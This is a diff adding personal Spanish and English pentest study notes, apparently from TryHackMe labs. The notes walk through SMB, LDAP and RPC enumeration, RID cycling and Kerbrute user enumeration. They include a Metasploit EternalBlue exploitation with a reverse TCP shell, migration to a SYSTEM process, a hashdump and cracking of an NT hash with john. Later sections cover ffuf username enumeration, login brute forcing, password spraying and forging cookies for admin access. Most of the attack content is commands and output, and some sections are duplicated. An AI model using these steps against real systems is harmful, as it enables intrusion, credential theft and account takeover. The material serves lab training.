@@ -1,0 +1,469 @@
+smbclient
+Permite la interacción con recursos compartidos de SMB y es parte de la suite Samba. 
+Es similar a un cliente FTP. Puede usarlo para enumerar, cargar, descargar y explorar archivos en un servidor SMB remoto. 
+En la terminal a continuación, intentamos enumerar las acciones a través de -L opción, sin contraseña, de ahí la -N opción. 
+
+
+smbclient -L //10.211.11.10 -N
+
+
+
+
+ smbmap, una herramienta de reconocimiento que enumera las acciones de SMB en un host. Se puede utilizar para mostrar permisos de lectura y escritura para cada recurso compartido. Es fundamental para identificar rápidamente recursos compartidos accesibles o mal configurados sin conectarse manualmente a cada uno. A continuación se muestra un ejemplo de ejecución smbmap -H TARGET_IP. Tenga en cuenta que smbmap se encuentra en /root/Desktop/Tools/Miscellaneous/smbmap en la Caja de Ataque.
+
+smbmap -H 10.211.11.10
+
+
+
+
+
+
+
+Vale la pena señalar que también puede descubrir qué acciones otorgan acceso utilizando Mapa. Usando Mapa’s smb-enum-shares script, podemos explorar qué acciones dan acceso a READ/WRITE, READ o no. La sintaxis es nmap -p445 --script smb-enum-shares 10.211.11.10.
+
+nmap -p445 --script smb-enum-shares 10.211.11.10
+
+
+
+
+
+
+Hay otras herramientas que también pueden resultar bastante útiles. Los ejemplos incluyen: impacket-smbclient, que es una implementación basada en Python de smbclient disponible en el kit de herramientas Impacket. El kit de herramientas Impacket está disponible en AttackBox en el /opt/impacket/examples/ directorio.
+
+CrackMapExec no es sólo para posexplotación sino también para enumeración. Incluye muchos SMB módulos para listar acciones, probar credenciales y muchos otros.
+
+El enum4linux o enum4linux-ng es una herramienta poderosa que realiza una enumeración extensa sobre SMB. Puedes intentarlo enum4linux -a TARGET_IP para obtener un tesoro de información. Podría ser una buena idea redirigir la salida a un archivo para poder recorrerlo lentamente.
+
+Por último, como se mencionó anteriormente en esta tarea, no debemos olvidarlo Mapa N con el smb-enum-shares guion.
+
+
+
+
+
+
+
+
+ldapsearch -x -H ldap://10.211.11.10 -s base
+
+-x: Simple authentication, in our case, anonymous authentication.
+-H: Specifies the LDAP server.
+-s: Limits the query only to the base object and does not search subtrees or children.
+If it is enabled, we should see lots of data, similar to the output below:
+
+
+ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
+
+
+
+
+
+
+
+
+
+
+
+
+Enum4linux-ng
+enum4linux-ng es una herramienta que automatiza diversas técnicas de enumeración en sistemas Windows, incluyendo la enumeración de usuarios. 
+Utiliza los protocolos SMB y RPC para recopilar información como listas de usuarios, pertenencia a grupos y detalles de recursos compartidos.
+
+Podemos ejecutar el siguiente comando para obtener la mayor cantidad de información posible del controlador de dominio:
+
+enum4linux-ng -A 10.211.11.10 -oA results.txt
+
+
+enum4linux 10.211.11.10 >> DomainEnum.txt
+
+
+
+
+
+
+
+We can run the following command to verify null session access with:
+
+rpcclient -U "" 10.211.11.10 -N
+
+-U: Used to specify the username, in our case, we are using an empty string for anonymous login.
+-N: Tells RPC not to prompt us for a password.
+If successful, we can enumerate users with: enumdomusers
+
+
+
+
+
+
+
+
+RID Cycling
+En Active Directory, los rangos de RID (Identificador Relativo) se utilizan para asignar identificadores únicos a objetos de usuario y grupo. Estos RID son componentes del Identificador de Seguridad (SID), que identifica de forma única cada objeto dentro de un dominio. Algunos RID son conocidos y están estandarizados.
+
+500 corresponde a la cuenta de Administrador, 501 a la de Invitado y los rangos 512-514 corresponden a los siguientes grupos: Administradores de Dominio, Usuarios de Dominio e Invitados de Dominio. Las cuentas de usuario suelen empezar a partir del RID 1000.
+
+Podemos usar enum4linux-ng para determinar el rango de RID, o podemos empezar con un rango conocido, por ejemplo, 1000-1200, e incrementarlo si obtenemos resultados.
+
+Si enumdomusers está restringido, podemos intentar consultar manualmente cada RID de usuario individual con este comando bash:
+
+
+
+for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
+
+for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
+
+
+
+for i in $(seq 500 2000): Primero ejecutamos un bucle for para iterar entre un rango de posibles RID e identificar cuentas de usuario válidas.
+echo "queryuser $i": consulta información sobre el usuario asociado con el RID $i.
+2>/dev/null: Redirige cualquier mensaje de error (error estándar) a /dev/null, silenciándolos.
+| grep -i "Nombre de usuario": filtra la salida para mostrar las líneas que contienen "Nombre de usuario", sin distinguir entre mayúsculas y minúsculas (-i).
+Tenga en cuenta que este comando puede tardar de 2 a 3 minutos en completarse.
+
+
+
+
+
+
+Enumeración de nombres de usuario con Kerbrute
+Kerberos es el protocolo de autenticación principal para dominios de Microsoft Windows. A diferencia de NTLM, que se basa en un mecanismo de desafío-respuesta, Kerberos utiliza un sistema basado en tickets gestionado por un tercero de confianza, el Centro de Distribución de Claves (KDC). Este enfoque no solo permite la autenticación mutua entre cliente y servidor, sino que también utiliza métodos de cifrado más robustos, lo que lo hace generalmente más resistente a ataques. Kerbrute es una herramienta de enumeración popular que se utiliza para forzar la enumeración de usuarios válidos de Active Directory mediante el abuso de la autenticación previa de Kerberos.
+
+Herramientas como enum4linux-ng o rpcclient pueden devolver algunos nombres de usuario, pero podrían ser:
+
+Cuentas deshabilitadas
+Cuentas que no pertenecen al dominio
+Usuarios falsos de honeypot
+O incluso falsos positivos
+Al ejecutarlos con Kerbrute, podemos confirmar cuáles son usuarios de AD reales y activos, lo que nos permite atacarlos con mayor precisión mediante rociado de contraseñas.
+
+Podemos crear una lista de usuarios gracias a los nombres de usuario recopilados con las herramientas anteriores.
+
+
+Kerbrute Installation
+
+1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases.
+
+2.) Rename kerbrute_linux_amd64 to kerbrute.
+
+3.) Run chmod +x kerbrute to make kerbrute executable.
+
+Please note that kerbrute is not installed on the AttackBox, and will require internet access if you wish to download and experiment with it.
+
+Kerbrute performs brute-force username enumeration against Kerberos:
+
+
+
+
+
+
+Enumeración de nombres de usuario con Kerbrute
+Kerberos es el protocolo de autenticación principal para dominios de Microsoft Windows. A diferencia de NTLM, que se basa en un mecanismo de desafío-respuesta, Kerberos utiliza un sistema basado en tickets gestionado por un tercero de confianza, el Centro de Distribución de Claves (KDC). Este enfoque no solo permite la autenticación mutua entre cliente y servidor, sino que también utiliza métodos de cifrado más robustos, lo que lo hace generalmente más resistente a ataques. Kerbrute es una herramienta de enumeración popular que se utiliza para forzar la enumeración de usuarios válidos de Active Directory mediante el abuso de la autenticación previa de Kerberos.
+
+Herramientas como enum4linux-ng o rpcclient pueden devolver algunos nombres de usuario, pero podrían ser:
+
+Cuentas deshabilitadas
+Cuentas que no pertenecen al dominio
+Usuarios falsos de honeypot
+O incluso falsos positivos
+Al ejecutarlos con Kerbrute, podemos confirmar cuáles son usuarios de AD reales y activos, lo que nos permite atacarlos con mayor precisión mediante rociado de contraseñas.
+
+Podemos crear una lista de usuarios gracias a los nombres de usuario recopilados con las herramientas anteriores.
+
+
+
+
+
+Explotación de EternalBlue (MS17–010)
+
+_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+
+
+
+EXPLOIT
+use exploit/windows/smb/ms17_010_eternalblue 
+exploit(windows/smb/ms17_010_eternalblue)
+
+set RHOSTS 10.10.244.83
+
+show payloads 
+
+set payload windows/x64/shell/reverse_tcp
+run
+
+
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+Alternatively, CTRL+Z can be used to background sessions.
+
+
+
+
+
+Escalate privileges, learn how to upgrade shells in metasploit.
+
+
+use post/multi/manage/shell_to_meterpreter
+
+sessions
+
+
+set session <session_id>
+
+//set LHOST 10.10.244.83 interfazRed/ip
+
+run
+
+ENTER 
+//session 
+
+
+
+sessions -i <session_id>
+
+
+
+
+
+MIGRATE
+1284  704   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM         C:\Windows\System32\spoolsv
+                                                                      .exe
+
+migrate 1284
+
+
+
+
+
+Cracking
+Dump the non-default user's password and crack it!
+
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter > 
+
+
+root@ip-10-10-69-200:~/Downloads# cat jon.txt 
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+root@ip-10-10-69-200:~/Downloads# 
+
+
+
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+
+alqfna22         (Jon)
+
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+
+
+search -f flag2.txt
+
+
+
+https://medium.com/@Z3pH7/tryhackme-blue-walkthrough-thm-c67236f5da29
+
+
+https://eunishap.medium.com/exploiting-eternalblue-ms17-010-a-walkthrough-and-protection-measures-1ef4145f51ed
+
+
+
+Password Spraying
+
+es una técnica de ataque que consiste en probar un pequeño conjunto de contraseñas comunes en varias cuentas. A diferencia de los ataques de fuerza bruta, el rociado de contraseñas evita el bloqueo de cuentas probando cada cuenta con solo unos pocos intentos, aprovechando las malas prácticas de contraseñas comunes en muchas organizaciones. El rociado de contraseñas suele ser eficaz porque muchas organizaciones:
+
+
+
+
+
+CrackMapExec es una conocida herramienta de explotación de servicios de red que utilizaremos en este módulo. Nos permite realizar enumeración, ejecución de comandos y ataques posteriores a la explotación en entornos Windows. Es compatible con varios protocolos de red, como SMB, LDAP, RDP y SSH. Si se permite el acceso anónimo, podemos recuperar la política de contraseñas sin credenciales con el siguiente comando:
+
+crackmapexec smb 10.211.11.10 --pass-pol
+
+
+
+
+
+
+
+
+dnsrecon 
+
+La enumeración de DNS (Sistema de Nombres de Dominio) por fuerza bruta consiste en probar decenas, cientos, miles o incluso millones de subdominios posibles de una lista predefinida de subdominios de uso común. Dado que este método requiere muchas solicitudes, lo automatizamos con herramientas para agilizar el proceso
+
+
+
+dnsrecon -t brt -d acmeitsupport.thm
+
+
+./sublist3r.py -d acmeitsupport.thm
+
+
+Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users), which maps domain names to IP addresses. 
+
+Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we've discovered a new website.
+
+Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.
+
+Start the AttackBox and then try the following command against the Acme IT Support machine to discover a new subdomain.
+
+ 
+
+ffuf
+user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.176.17
+The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.
+
+Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.
+
+ffuf
+user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.176.17 -fs {size}
+This command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size.
+
+The above command should have revealed two positive results that we haven't come across before.
+
+
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.176.17 -fs 2395
+
+
+
+root@attackbox:~# systemctl start postgresql 
+root@attackbox:~# sudo -u postgres msfdb init
+
+
+> workspace -a tryhackme
+
+
+
+> search smb_login
+
+
+
+
+
+
+
+
+
+
+Username Enumeration
+
+A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.
+
+
+
+Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://10.10.107.3/customers/signup) signup page.
+
+
+
+If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.
+
+
+
+Username enumeration with ffuf
+user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.107.3/customers/signup -mr "username already exists"
+In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type so the web server knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.
+
+The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.
+
+Create a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.
+
+
+
+
+
+
+
+
+Fuerza Bruta
+
+Un ataque de fuerza bruta es un proceso automatizado que prueba una lista de contraseñas de uso común con un solo nombre de usuario o, como en nuestro caso, con una lista de nombres de usuario.
+
+
+root@ip-10-10-83-113:~# cat users.txt 
+admin
+robert
+simon
+steve
+
+
+
+Al ejecutar este comando, asegúrese de que la terminal esté en el mismo directorio que el archivo valid_usernames.txt.
+
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.107.3/customers/login -fc 200
+Este comando ffuf es ligeramente diferente al de la Tarea 2. Anteriormente, usábamos la palabra clave FUZZ para seleccionar en qué parte de la solicitud se insertarían los datos de las listas de palabras, pero como usamos varias listas de palabras, debemos especificar nuestra propia palabra clave FUZZ. En este caso, hemos elegido W1 para nuestra lista de nombres de usuario válidos y W2 para la lista de contraseñas que probaremos. Las listas de palabras múltiples se especifican nuevamente con el argumento -w, pero se separan con una coma. Para una coincidencia positiva, usamos el argumento -fc para verificar un código de estado HTTP distinto de 200.
+
+
+
+
+
+
+COOKIS
+
+curl http://10.10.107.3/cookie-test
+
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.107.3/cookie-test
+
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.107.3/cookie-test
+
+
+
+
+Hashing
+
+Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:
+
+Original String
+Hash Method
+Output
+1
+md5
+c4ca4238a0b923820dcc509a6f75849b
+1
+sha-256
+6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+1
+sha-512	4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
+1
+sha1
+356a192b7913b04c54574d18c28d46e6395428ab
+You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.
+
+Encoding
+
+Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
+
+Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
+
+Take the below data as an example which is set by the web server upon logging in:
+
+Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+
+This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.
+
+
+
+https://www.base64decode.org/
+
+
+echo -n '{"id":1,"admin":true}' | base64
+
+
+eyJpZCI6MSwiYWRtaW4iOnRydWV9
